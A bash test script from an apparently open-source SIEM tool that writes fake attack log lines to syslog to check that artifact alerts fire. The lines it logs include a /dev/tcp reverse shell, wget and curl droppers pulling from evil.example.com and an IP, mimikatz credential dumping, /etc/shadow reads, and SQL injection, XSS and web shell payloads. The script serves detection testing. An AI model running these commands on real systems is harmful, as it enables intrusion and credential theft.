#!/bin/bash
# OpenSIEM - GPL-3.0 Licensed
# Copyright (c) 2024–present
# See LICENSE for details.
# =============================================================================
# OpenSIEM Atom v1 — Malicious Artifact Test Log Generator
#
# Generates syslog entries via logger that contain artifact strings seeded by
# seed_artifacts.sh. Each log line will trigger an ipchecker alarm because the
# artifact substring appears inside the message.
#
# Usage:
#   chmod +x test_artifacts.sh
#   ./test_artifacts.sh            # run all
#   ./test_artifacts.sh high       # only high severity
#   ./test_artifacts.sh mid        # only medium severity
#   ./test_artifacts.sh low        # only low severity
#
# Wait 3–5 seconds after running then check the Alerts page.
# =============================================================================

DELAY=1   # seconds between logger calls — increase if watcher poll is slow

RED='\033[0;31m'; YLW='\033[1;33m'; GRN='\033[0;32m'
CYN='\033[0;36m'; ORG='\033[0;33m'; NC='\033[0m'

send() { logger "$1"; echo -e "  ${CYN}→${NC} $1"; sleep "$DELAY"; }

hdr() {
    echo ""
    echo -e "${1}══════════════════════════════════════════════${NC}"
    echo -e "${1}  ${2}${NC}"
    echo -e "${1}══════════════════════════════════════════════${NC}"
}

# =============================================================================
# HIGH SEVERITY TESTS
# =============================================================================
test_high() {
    hdr "$RED" "🔴 HIGH SEVERITY ARTIFACT TESTS"

    echo -e "\n  ${RED}[Reverse Shell Attempt]${NC}"
    send "kernel: audit: type=EXECVE argc=3 a0=bash a1=-c a2=/bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1"

    echo -e "\n  ${RED}[C2 Beacon — Known Malicious IP]${NC}"
    send "kernel: UFW BLOCK IN= OUT=eth0 SRC=192.168.1.100 DST=185.220.101.5 PROTO=TCP SPT=54321 DPT=443"

    echo -e "\n  ${RED}[Malware Dropper — wget to /tmp]${NC}"
    send "waqar sudo: COMMAND=wget -O /tmp/update.sh http://evil.example.com/stage2"

    echo -e "\n  ${RED}[Malware Dropper — curl to /tmp]${NC}"
    send "waqar bash: curl -o /tmp/implant http://194.165.16.11/payload"

    echo -e "\n  ${RED}[Chmod Executable in /tmp]${NC}"
    send "kernel: audit: type=SYSCALL syscall=268 exe=/bin/bash cmd=chmod +x /tmp/update.sh uid=1000"

    echo -e "\n  ${RED}[Meterpreter Session Detected]${NC}"
    send "snort[1234]: ALERT TCP 185.220.101.5:4444 -> 192.168.1.100:54321 meterpreter stage payload detected"

    echo -e "\n  ${RED}[Mimikatz — Credential Dumping]${NC}"
    send "sysmon: ProcessCreate pid=6789 image=mimikatz.exe commandline=mimikatz privilege::debug sekurlsa::logonpasswords"

    echo -e "\n  ${RED}[Sudo to Full Shell — Privilege Escalation]${NC}"
    send "sudo: waqar : TTY=pts/0 ; PWD=/home/waqar ; USER=root ; COMMAND=/bin/bash"

    echo -e "\n  ${RED}[Shadow File Access Attempt]${NC}"
    send "kernel: audit: type=SYSCALL syscall=2 exe=/bin/cat comm=cat name=/etc/shadow uid=1000 result=EACCES"

    echo -e "\n  ${RED}[Ransomware — Encrypted Extension]${NC}"
    send "kernel: inotify: /home/waqar/documents/report.docx.encrypted created by pid=9999 exe=/tmp/exec"

    echo -e "\n  ${RED}[Web Shell Access]${NC}"
    send "192.168.1.50 - - [23/Mar/2026:14:00:00 +0500] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 42"

    echo -e "\n  ${RED}[PHP Eval Base64 Web Shell]${NC}"
    send "192.168.1.55 - - [23/Mar/2026:14:00:01 +0500] \"POST /images/cmd.php HTTP/1.1\" 200 18 body=eval(base64_decode"

    echo -e "\n  ${GRN}✓ High severity tests sent${NC}"
}

# =============================================================================
# MID SEVERITY TESTS
# =============================================================================
test_mid() {
    hdr "$YLW" "🟡 MEDIUM SEVERITY ARTIFACT TESTS"

    echo -e "\n  ${YLW}[Port Scanner — nmap]${NC}"
    send "kernel: audit: type=EXECVE argc=5 a0=nmap a1=-sV a2=-p- a3=192.168.1.0/24 uid=1000"

    echo -e "\n  ${YLW}[SQL Injection Attempt — UNION SELECT]${NC}"
    send "192.168.1.88 - - [23/Mar/2026:14:01:00 +0500] \"GET /search?q=1' UNION SELECT username,password FROM users-- HTTP/1.1\" 500 89"

    echo -e "\n  ${YLW}[SQL Injection — OR 1=1]${NC}"
    send "192.168.1.88 - - [23/Mar/2026:14:01:01 +0500] \"POST /login HTTP/1.1\" 200 512 body=username=admin&password=' OR '1'='1"

    echo -e "\n  ${YLW}[Path Traversal / LFI]${NC}"
    send "192.168.1.88 - - [23/Mar/2026:14:01:02 +0500] \"GET /page?file=/../../../etc/passwd HTTP/1.1\" 200 2741"

    echo -e "\n  ${YLW}[XSS Attempt]${NC}"
    send "192.168.1.88 - - [23/Mar/2026:14:01:03 +0500] \"GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\" 400 162"

    echo -e "\n  ${YLW}[Web App Scanner — gobuster]${NC}"
    send "192.168.1.77 - - [23/Mar/2026:14:01:04 +0500] \"GET /admin HTTP/1.1\" 404 162 \"\" \"gobuster/3.1.0\""

    echo -e "\n  ${YLW}[Credential Brute Force — hydra]${NC}"
    send "sshd[3456]: Failed password for invalid user hydra from 192.168.1.77 port 45123 ssh2"

    echo -e "\n  ${YLW}[sqlmap Automated SQL Injection]${NC}"
    send "192.168.1.77 - - [23/Mar/2026:14:01:05 +0500] \"GET /api/users?id=1 HTTP/1.1\" 500 89 \"\" \"sqlmap/1.7\""

    echo -e "\n  ${YLW}[WordPress Config Grab]${NC}"
    send "192.168.1.66 - - [23/Mar/2026:14:01:06 +0500] \"GET /wp-config.php HTTP/1.1\" 403 512"

    echo -e "\n  ${YLW}[WordPress XMLRPC Brute Force]${NC}"
    send "192.168.1.66 - - [23/Mar/2026:14:01:07 +0500] \"POST /xmlrpc.php HTTP/1.1\" 200 512"

    echo -e "\n  ${YLW}[Netcat Reverse Shell Listener]${NC}"
    send "kernel: audit: type=EXECVE argc=4 a0=nc a1=-lvp a2=4444 uid=1000 exe=/usr/bin/nc"

    echo -e "\n  ${YLW}[Base64 Payload Decode]${NC}"
    send "bash: waqar ran: echo aW1wb3J0IHNvY2tldA== | base64 -d | python3"

    echo -e "\n  ${YLW}[Bash History Cleared]${NC}"
    send "bash: waqar ran: history -c && unset HISTFILE"

    echo -e "\n  ${YLW}[Authorized Keys Modification]${NC}"
    send "kernel: audit: type=SYSCALL syscall=2 name=/.ssh/authorized_keys flags=O_WRONLY uid=1000 exe=/bin/bash"

    echo -e "\n  ${GRN}✓ Medium severity tests sent${NC}"
}

# =============================================================================
# LOW SEVERITY TESTS
# =============================================================================
test_low() {
    hdr "$GRN" "🟢 LOW SEVERITY ARTIFACT TESTS"

    echo -e "\n  ${GRN}[Exposed .env File Probe]${NC}"
    send "192.168.1.44 - - [23/Mar/2026:14:02:00 +0500] \"GET /.env HTTP/1.1\" 404 162"

    echo -e "\n  ${GRN}[Git Config Exposure Probe]${NC}"
    send "192.168.1.44 - - [23/Mar/2026:14:02:01 +0500] \"GET /.git/config HTTP/1.1\" 200 312"

    echo -e "\n  ${GRN}[Database Backup Grab Attempt]${NC}"
    send "192.168.1.44 - - [23/Mar/2026:14:02:02 +0500] \"GET /backup.sql HTTP/1.1\" 404 162"

    echo -e "\n  ${GRN}[WordPress Login Page — Automated]${NC}"
    send "192.168.1.33 - - [23/Mar/2026:14:02:03 +0500] \"POST /wp-login.php HTTP/1.1\" 302 0"

    echo -e "\n  ${GRN}[Joomla Admin Panel Probe]${NC}"
    send "192.168.1.33 - - [23/Mar/2026:14:02:04 +0500] \"GET /administrator HTTP/1.1\" 200 8192"

    echo -e "\n  ${GRN}[Tomcat Manager Probe]${NC}"
    send "192.168.1.33 - - [23/Mar/2026:14:02:05 +0500] \"GET /manager/html HTTP/1.1\" 401 2176"

    echo -e "\n  ${GRN}[SSH Authentication Failure]${NC}"
    send "sshd[4567]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.22 user=root"

    echo -e "\n  ${GRN}[SSH Invalid User]${NC}"
    send "sshd[4568]: invalid user testuser from 192.168.1.22 port 51234"

    echo -e "\n  ${GRN}[DROP TABLE — SQL Executed]${NC}"
    send "postgresql[5432]: ERROR: syntax error: DROP TABLE users; attempted by user=webapp db=production"

    echo -e "\n  ${GRN}[Background Process Hiding — /dev/null redirect]${NC}"
    send "bash: root ran: /tmp/updater.sh > /dev/null 2>&1 &"

    echo -e "\n  ${GRN}[nohup Persistent Process]${NC}"
    send "bash: www-data ran: nohup python3 /tmp/server.py &"

    echo -e "\n  ${GRN}[Shodan Scan Detected]${NC}"
    send "192.168.1.1 - - [23/Mar/2026:14:02:10 +0500] \"GET / HTTP/1.1\" 200 1024 \"\" \"Shodan/1.0\""

    echo -e "\n  ${GRN}✓ Low severity tests sent${NC}"
}

# =============================================================================
# Dispatch
# =============================================================================
echo -e "${CYN}"
echo "  ╔══════════════════════════════════════════════╗"
echo "  ║  OpenSIEM Atom v1 — Artifact Test Generator  ║"
echo "  ║  Delay between messages: ${DELAY}s                  ║"
echo "  ╚══════════════════════════════════════════════╝"
echo -e "${NC}"

case "${1:-all}" in
    high) test_high ;;
    mid)  test_mid  ;;
    low)  test_low  ;;
    all)
        test_high
        test_mid
        test_low
        ;;
    *)
        echo "Usage: $0 [high|mid|low|all]"
        exit 1
        ;;
esac

echo ""
echo -e "${GRN}══════════════════════════════════════════════${NC}"
echo -e "${GRN}  All tests sent. Check the Alerts page.     ${NC}"
echo -e "${GRN}  Artifacts → Hits tab for grouped view.     ${NC}"
echo -e "${GRN}══════════════════════════════════════════════${NC}"
echo ""
